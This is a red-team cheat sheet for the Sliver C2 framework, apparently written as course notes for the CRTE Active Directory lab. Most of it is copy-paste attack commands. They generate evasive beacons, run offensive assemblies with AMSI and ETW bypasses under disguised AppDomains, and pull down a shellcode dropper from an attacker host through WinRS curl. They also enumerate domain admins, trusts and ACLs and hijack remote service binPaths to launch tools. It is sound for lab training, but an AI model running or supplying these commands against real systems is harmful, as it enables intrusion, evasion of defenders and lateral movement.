# Sliver C2 And Tools CheatSheet CRTE
Sliver is a C2 created by BishopFox compiled in the go language.

Note: Sliver has a lot of OpSec issues

## Basic Commands



| Command | Info |
| ------ | ------ |
| ```beacons``` | lists current beacons with info
| ```background``` | backgrounds current session (much like msfconsole)
| ```sessions``` | list current sessions
| ```use -i <id>``` | use beacon/session with the given id 
| ```info``` | lists info of current session
| ```armory``` | lists avaliable extensions
| ```armory install <extension>``` | installs an extension
| ```loot``` | displays loot saved
| ```implants``` | displays implants
| ```jobs``` | lists current jobs
| ```pivots``` | lists pivots
| ```pivots tcp -l <port>``` | create tcp pivot with port <port>
| ```interactive``` | used with a beacon to start an interactive session
| ```shell``` | starts an interactive shell

*Note: using ```shell``` is less OppSec friendly and it is recommended to use ```interactive```

## Listeners
Various listeners are support by Sliver and can be automatically started using these various protocols:
```sh
dns
http
https
mtls
```

In the CRTE we use https.
## Beacons
| Options | Info |
| ------ | ------ |
| ```generate beacon <options>``` | base command to generate a beacon
| ```-b or --http http://10.0.0.23``` | use the http or https protocol
| ```-i or --tcp-pivot 10.0.0.23:<port>``` | create a pivot beacon with port ```<port>```
| ```-f or --format shellcode``` | generate the beacon in this format
| ```-N or --name Name``` | the name displayed in Sliver
| ```-e or --evasion``` | creates the beacon with some evasion
| ```-m or --mtls``` | uses mtls protocol
| ```-d or --dns``` | uses dns protocol
| ```-s or --save /path/to/save/file.format``` | displays implants

## Template

Useful commands for easy copy pasta

#### Tool template
```sh
execute-assembly -A /RuntimeWide -d TaskSchedulerRegularMaintenanceDomain -p 'C:\Windows\System32\taskhostw.exe' -t 80 '/home/kali/Desktop/CRTE Tools/Sliver/someTool.exe'
```

#### WinRS command template
```sh
execute -o -S -t 50 cmd /c winrs -r:some-host "command"
```

#### Local Admin check for "someUser"
```sh
execute-assembly -A /RuntimeWide -d TaskSchedulerRegularMaintenanceDomain -p 'C:\windows\system32\taskhostw.exe' -t 80 '/home/kali/Desktop/Tools/Sliver/LACheck.exe' 'winrm /ldap:servers-exclude-dc /threads:10 /domain:us.techcorp.local /user:someUser'
```

#### Download NtDropper.exe to 'some-target'
```sh
execute -o -S -t 20 winrs -r:some-target 'curl -o C:\Windows\Temp\NtDropper.exe --url http://192.168.100.83/NtDropper.exe'
```
## execute-assembly options
| Options | Info |
| ------ | ------ |
| ```-A or --process-arguments``` | Args given to the process we're using
| ```-p or --process``` | Process file path to use. In the course we use taskhostw.exe (see above) but there are many other bins we can abuse
| ```-d or --app-domain``` | The app domain to use. For OppSec, ensure to use a valid app domain
| ```-M or --amsi-bypass``` | Bypass for amsi
| ```-E or --etw-bypass``` | Bypass for etw
| ```-P or --ppid``` | Process PPID to spoof

##### Note on -M and -E:
- AMSI / ETW bypasses using execute-assembly in Sliver can only be performed in the current process (Self-Injection) and not in a remote process. Use the -i flag to perform execution within the current Sliver beacon process. To perform an AMSI/ETW bypass in a remote process use the inject-amsi-bypass and inject-etw-bypass commands.

#### Processes, app-domains, and process-arguments
##### Notes

- In the .NET framework, an AppDomain is a lightweight process-like boundary inside a running process. When you specify an AppDomain name, you’re telling the runtime environment how to label the isolated environment in which your assembly will execute. Using a custom or “benign”-looking AppDomain name can help you blend in with normal .NET activity on the target system.
- Many .NET assemblies are console applications that expect certain arguments to be passed when they start. By supplying these arguments via Sliver’s -A option, you provide the command-line parameters that the assembly’s Main() method would normally receive if it were started as a standalone program. Customizing these arguments to appear normal or to match expected parameters can reduce suspicion.
- Security tools may flag suspicious assembly execution based on known signatures or patterns. If you just run a known offensive tool without specifying a thoughtful AppDomain name or without the correct arguments, it might get flagged as abnormal. By using a more “legitimate”-looking AppDomain name and proper arguments, you can reduce the anomaly score in certain behavioral detection engines.

## Getting a session
```
1. generate beacon (use shellcode format)
2. host shellcode
3. use NtDropper.exe on target to start your session
```
Obviously there are many ways to do this, however this is what is shown in CRTE
## Tools

#### NtDropper.exe
NtDropper is a PE Loader that we can use to perform process injection into a target a target process. It will download and invoke hosted shellcode.

```NtDropper.exe <IP> <shellcode path>```
ex:
```NtDropper.exe 10.0.0.23 Implants/shellcode.bin```
this will download shellcode directly from ```http://10.0.0.23:80/Implants/shellcode.bin```
#### Enumeration with ADSearch.exe

Helpful tool to enumerate Active Directory. In Sliver, we would execute this tool on the target system by typing:

```execute-assembly -A /RuntimeWide -d TaskSchedulerRegularMaintenanceDomain -p 'C:\Windows\System32\taskhostw.exe' -t 80 '/home/kali/Desktop/CRTE Tools/Sliver/ADSearch.exe' '<options>'```
Basic options:
| Options | Info |
| ------ | ------ |
| ```'--users'``` | Enumerate users
| ```'--computers'``` | Enumerate computers
| ```'--domain-admins'``` | Enumerate domain admins

We can also perform LDAP queries using ADSearch, which makes this a very powerful tool. To do this we would use ```'--search "<query>" --attributes <attributes>'```

If copy pasting, ensure to include the openning and closing ticks
| Search Options | Info |
| ------ | ------ |
| ```'--search "(&(objectCategory=group)(cn=enterprise admins))" --attributes cn,member --domain techcorp.local'``` | Enumerate enterprise admins
| ```'--search "(objectCategory=organizationalUnit)" --attributes name'``` | List all OU's
| ```'--search "(OU=SomeOU)" --attributes distinguishedname'``` | Enumerate DistinguishedName for SomeOU
| ```'--search "(objectCategory=groupPolicyContainer)" --attributes displayname'``` | Enumerate GPO's
| ```'--search "(OU=SomeOU)" --attributes gplink'``` | Enumerate GPOs applied to SomeOU. This is step one. See below table for step 2*
| ```'-d some.domain.local --search "(objectClass=trustedDomain)" --attributes cn,flatName,trustDirection,trustPartner,name,objectClass,trustAttributes --json'``` | Map trusts of some.domain.local. We can add the --json arg to give us the results in json format for readibility |
| ```'-d some.domain.local --search "(trustAttributes=4)" --attributes cn,flatName,trustDirection,trustPartner,name,objectClass,trustAttributes --json'``` | Map External Trusts |
| ```'-d some.trust.local --search "(objectClass=trustedDomain)" --attributes cn,flatName,trustDirection,trustPartner,name,objectClass,trustAttributes --json'``` | Enumerate trusts of a trusting forest |

Step 2* ```'--search "(&(objectCategory=groupPolicyContainer)((|name={gplink ID})))" --attributes displayname'```

MD formatting wouldn't allow me to add | (pipe)
#### ADCollector.exe
```execute-assembly -A /RuntimeWide -d TaskSchedulerRegularMaintenanceDomain -p 'C:\Windows\System32\taskhostw.exe' -t 80 '/home/kali/Desktop/CRTE Tools/Sliver/ADCollector.exe'```
- We can use ADCollector to easily enumerate DACLs and ACLs
- The above command specifically can in some cases return plaintext passwords

| Options | Info |
| ------ | ------ |
| ```'--DACL "CN=GROUP NAME,CN=USERS,DC=US,DC=TECHCORP,DC=LOCAL"'``` | Enumerate ACLs for the group GROUP NAME
| ```'--ACLScan "someUser"'``` | Enumerate All modify rights/permissions for someUser

#### StandIn.exe

- Most of the commands for ADSearch.exe can also be done using StandIn.exe (these wont be listed).
- StandIn.exe uses the ```--ldap``` and ```--filter``` flags to perform LDAP queries.

## Service Manipulation

### sa-sc-enum
Use this to enumerate services on a target.
```sa-sc-enum <target>```

We can also do this in WinRS for specific services - query config qc
```execute -o -S -t 10 winrs -r:target 'sc qc some-service'```

### remote-sc-*, and scshell
Varrious armory commands to manipulate remote target services. We can also do this via WinRS.

##### remotely stop a service
```remote-sc-stop -t 25 "target" "service"```

##### remotely start a service
```remote-sc-start -t 25 "target" "service"```

##### remotely change a service configuration
```remote-sc-config -t 25 "target" "service" "binpath" errormode(0-3) startmode(0-4)```

##### remote start service with winRS
```execute -o -S -t 50 cmd /c winrs -r:TARGET -u:"SomeUser" -p:"Password" sc start some-service```
###### NOTE: -u and -p are not always required, in some cases you can run the command without this

##### remotely configure service with winRS
```execute -o -S -t 50 cmd /c winrs -r:TARGET -u:"SomeUser" -p:"Password" sc config some-service binPath="C:\Windows\System32\cmd.exe /c start /b C:\Windows\Temp\SomeTool.exe toolArguments"```
###### NOTE: as above, -u and -p are not always required
###### NOTE: in some cases, you may need to also add start=auto to config
```execute -o -S -t 50 cmd /c winrs -r:TARGET -u:"SomeUser" -p:"Password" sc config some-service start= auto```

